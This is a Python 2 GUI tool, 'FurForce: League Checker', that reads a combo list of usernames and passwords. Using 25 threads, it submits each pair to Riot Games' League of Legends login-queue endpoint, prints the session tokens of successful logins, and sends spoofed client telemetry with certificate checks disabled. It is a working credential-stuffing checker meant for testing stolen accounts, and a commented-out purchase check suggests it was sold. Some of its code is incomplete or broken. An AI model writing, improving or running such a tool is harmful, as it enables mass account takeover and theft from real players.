# -*- coding: utf-8 -*-
__author__ = 'Furry~'
import concurrent.futures
import requests
import requests.exceptions
import sys
import uuid
import Tkinter as Tk
import time
import json
from tkFileDialog import askopenfilename


class App():
    def __init__(self, parent):

        # Check To See If You Purchased c:
        # self.ownercheck()

        # Check To See If There's An Update
        # self.updatecheck()

        # Setup Window
        self.window = parent
        self.window.title('FurForce: League Checker')

        # Set Variables
        self.fileopenoptions = dict(defaultextension='.txt', filetypes=[('Text file', '*.txt'), ('All files', '*.*')])
        self.combos = Tk.StringVar(self.window)
        self.queue_urls = {
            'auth': '/login-queue/rest/queue/authenticate',
            'ticker': '/login-queue/rest/queue/ticker',
            'token': '/login-queue/rest/queue/authToken'
        }
        self.login_queue_host = {
            'EUW': 'lq.eu.lol.riotgames.com',
            'EUNE': 'lq.eun1.lol.riotgames.com',
            'NA': 'lq.na1.lol.riotgames.com',
            'BR': 'lq.br.lol.riotgames.com',
            'LAN': 'lq.la1.lol.riotgames.com',
            'LAS': 'lq.la2.lol.riotgames.com',
            'RU': 'lq.ru.lol.riotgames.com'
        }
        self.rpc_host = {
            'EUW': 'prod.eu.lol.riotgames.com',
            'EUNE': 'prod.eun1.lol.riotgames.com',
            'NA': 'prod.na1.lol.riotgames.com',
            'BR': 'prod.br.lol.riotgames.com',
            'LAN': 'prod.la1.lol.riotgames.com',
            'LAS': 'prod.la2.lol.riotgames.com',
            'RU': 'prod.ru.lol.riotgames.com'
        }

        # Make Widgets
        self.labelcombos = Tk.Label(self.window, text="Combo List: ")
        self.entrycombos = Tk.Entry(self.window, textvariable=self.combos)
        self.startbutton = Tk.Button(self.window, text="Start!", command=self.start)
        self.combosbutton = Tk.Button(self.window, text="Open Combo File!", command=self.setcombos)

        # Grid Widgets
        self.labelcombos.grid(row=0, column=0, sticky=Tk.W)
        self.entrycombos.grid(row=0, column=1, columnspan=4, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.combosbutton.grid(row=0, column=5, sticky=Tk.W+Tk.E+Tk.N+Tk.S)
        self.startbutton.grid(row=1, column=0, columnspan=6, sticky=Tk.W+Tk.E+Tk.N+Tk.S)

    def uplay(self, user, passw):
        global work
        work = True
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows; U; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) AdobeAIR/3.7',
            'Cookie': 'mp_super_properties=%7B%22all%22%3A%20%7B%22%24initial_referrer%22%3A%20%22http%3A//adobe.com/ap'
                      'ollo%22%2C%22%24initial_referring_domain%22%3A%20%22adobe.com%22%2C%22distinct_id%22%3A%20%22393'
                      '76314%22%7D%2C%22events%22%3A%20%7B%7D%2C%22funnels%22%3A%20%7B%7D%7D',
            'Referer': 'app:/LolClient.swf/[[DYNAMIC]]/73',
            'Accept': 'text/xml, application/xml, application/xhtml+xml, text/html;q=0.9, text/plain;q=0.8, text/css, i'
                      'mage/png, image/jpeg, image/gif;q=0.8, application/x-shockwave-flash, video/mp4;q=0.9, flv-appli'
                      'cation/octet-stream;q=0.8, video/x-flv;q=0.7, audio/mp4, application/futuresplash, */*;q=0.5'
        }
        while work:
            try:
                response = requests.post(
                    'https://lq.na1.lol.riotgames.com/login-queue/rest/queues/lol/authenticate',
                    'payload=user%3D{0}%2Cpassword%3D{1}'.format(user, passw),
                    timeout=7.5,
                    headers=headers,
                    verify=False
                )
                jsre = json.loads(response.text)
                print jsre
                if 'QUEUE' not in jsre['status']:
                    for ticker in jsre['tickers']:
                        if ticker['node'] is jsre['node']:
                            break
                        else:
                            id = ticker['id']
                            curr = ticker['current']
                            rate = ticker['rate']
                            while curr < id:
                                pos = id - curr
                                print 'In Queue:', pos,  '\nsleeping for', jsre['rate'] * 0.001
                                time.sleep(jsre['rate'] * 0.001)
                    print jsre['lqt']['account_id'], jsre['lqt']['timestamp'], jsre['lqt']['signature'], jsre['lqt']['account_name'], jsre['lqt']['uuid'], jsre['lqt']['fingerprint']
                    r = requests.post(
                        'https://ekg.riotgames.com/messages',
                        '{"session_id":"{0}","client_version":"4.9.14_05_28_22_32","timestamp":{1},"app":"air","send_probability":1,"region":"NA1","data_perceived_login.start_time":12932,"summoner_level":30,"data_actual_login.duration":468,"summoner_id":44183194,"data_perceived_login.end_time":18764,"messageType":"pvpnet_login","data_perceived_login.duration":5832,"os_type":"windows","gas_auth_token":"0","data_errors.error_count":1,"os_version":"Windows 7","auth_state":"authedclient","data_tracker_version":"4.12.12","client_language":"en_US","account_id":"206973205","data_auth_retry_attempts":0,"data_success":true,"data_actual_login.start_time":12932,"data_actual_login.end_time":13400}'
                        ''.format(
                            jsre['lqt']['timestamp'],
                        ),
                        timeout=7.5,
                        headers=headers,
                        verify=False
                    )
                    jsr = json.loads(r.text)
                    print jsr
                work = False
            except requests.exceptions.HTTPError:
                print "HTTP Error!"
                work = True
            except requests.exceptions.ConnectionError:
                print "Connection Error!"
                work = True
            except requests.exceptions.Timeout:
                print "Timeout Error!"
                work = True

    def ticker(self, champ):
        headers = {
            'Referer': 'app:/LolClient.swf/[[DYNAMIC]]/73',
            'Accept': 'text/xml, application/xml, application/xhtml+xml, text/html;q=0.9, text/plain;q=0.8, text/css, i'
                      'mage/png, image/jpeg, image/gif;q=0.8, application/x-shockwave-flash, video/mp4;q=0.9, flv-appli'
                      'cation/octet-stream;q=0.8, video/x-flv;q=0.7, audio/mp4, application/futuresplash, */*;q=0.5'
        }
        r = requests.post(
            'https://{0}{1}/{2}'.format(self.login_queue_host['NA'], self.queue_urls['ticker'], champ)
        )

    def start(self):
        if self.entrycombos.get() == '':
            print 'You didn\'t add any combos!'
        else:
            with open(self.entrycombos.get(), 'r') as f:
                global userpass
                userpass = f.readlines()
                f.close()
        with concurrent.futures.ThreadPoolExecutor(max_workers=25) as x:
            for userpasscombo in userpass:
                upass = userpasscombo.split(':')
                x.submit(self.uplay, upass[0].strip(), upass[1].strip())

    def setcombos(self):
        filename = askopenfilename(**self.fileopenoptions)
        self.combos.set(filename)

if __name__ == "__main__":
    root = Tk.Tk()
    app = App(root)
    root.mainloop()